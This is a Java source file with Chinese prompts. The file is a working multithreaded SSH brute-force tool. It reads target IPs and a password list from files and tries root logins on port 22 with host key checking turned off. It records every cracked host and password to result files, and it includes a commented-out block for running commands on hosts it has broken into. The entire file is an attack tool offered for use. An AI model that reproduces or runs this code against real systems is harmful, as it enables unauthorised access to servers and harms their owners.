package ddd;

import java.io.*;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;



 class SSHLinux {
     public static ArrayList<String> pass = new ArrayList<String>();
     public static LinkedList<String> ip = new LinkedList<String>();
     public static ArrayList<String> success = new ArrayList<String>();
     public static int ok=0;

     public static void main(String[] args) throws Exception {
         System.out.println("爆破中输入0回车可以查看爆破情况,可能爆一些奇怪的东西出来（");
         java.util.Scanner s = new java.util.Scanner(System.in);
         System.out.print("简单的ssh爆破工具，请输入线程:");
         int thread =s.nextInt();
         System.out.println("读取密码和ip，放在本jar包目录下");
         read();
         pass.add("end");
         File file = new File("result.txt");
         file.createNewFile();
         File file1 = new File("resultIp.txt");
         file1.createNewFile();
         ExecutorService executor = Executors.newFixedThreadPool(thread);
         int number=ip.size();
         for (int i = 0; i < number; i++) {
             for (int i1 = 0; i1 < pass.size(); i1++) {
                 executor.execute( new DivTask(ip.getFirst(), pass.get(i1)));
             }
             ip.removeFirst();
         }
         while (true){
         java.util.Scanner s1 = new java.util.Scanner(System.in);
         int order =s.nextInt();
         if(order==0) {
             System.out.println("已经完成的ip数" + ok + "总ip数:" + number + "剩余ip数:" + (number - ok) );
         }
         }
     }
     public static void write(String result) throws IOException {
         FileWriter writer = new FileWriter("result.txt",true);
         // 向文件写入内容
         writer.write(result+"\n");
         writer.flush();
         writer.close();
     }
     public static void writeIP(String result) throws IOException {
         FileWriter writer = new FileWriter("resultIp.txt",true);
         // 向文件写入内容
         writer.write(result+"\n");
         writer.flush();
         writer.close();
     }
     public static void read(){
         try {
             BufferedReader in = new BufferedReader(new FileReader("pass.txt"));
             while (in.ready()) {
                 pass.add(in.readLine());
             }
             in.close();
         } catch (IOException e) {
             System.out.println("未找到pass.txt文件");
         }
         try {
             BufferedReader in = new BufferedReader(new FileReader("ip.txt"));
             while (in.ready()) {
                 ip.add(in.readLine());
             }
             in.close();
         } catch (IOException e) {
             System.out.println("未找到ip.txt文件");
         }
     }
     static class DivTask implements Runnable {
         String ip,pass;

         public DivTask(String first, String s) {
            ip=first;
            pass=s;
         }

         @Override
         public void run() {
             try {
                 lgoin(ip,22,"root",pass,"");
             } catch (Exception e) {
                 e.printStackTrace();
             }
         }

     }
     public static void lgoin(String host, int port, String user, String password, String command) throws  Exception {
        JSch jsch = new JSch();
        Session session = jsch.getSession(user, host, port);
        session.setTimeout(10000);
        session.setConfig("StrictHostKeyChecking", "no");
        //    java.util.Properties config = new java.util.Properties();
        //   config.put("StrictHostKeyChecking", "no");
        session.setPassword(password);
        try {
            session.connect();
            if(!success.contains(host)){
                success.add(host);
                System.out.println("爆破成功 "+host+":"+password);
                write("爆破成功 "+session.getHost()+":"+password);
                writeIP(host);
            }
        } catch (JSchException e) {
            if(password == "end"){
                System.out.println("bad:"+host);
                ok++;
            }
        }
        //执行命令
//        ChannelExec channelExec = (ChannelExec) session.openChannel("exec");
//        InputStream in = channelExec.getInputStream();
//        channelExec.setCommand(command);
//        channelExec.setErrStream(System.err);
//        channelExec.connect();
//
//        String out = IOUtils.toString(in, StandardCharsets.UTF_8);
//        channelExec.disconnect();
        session.disconnect();
     }
}
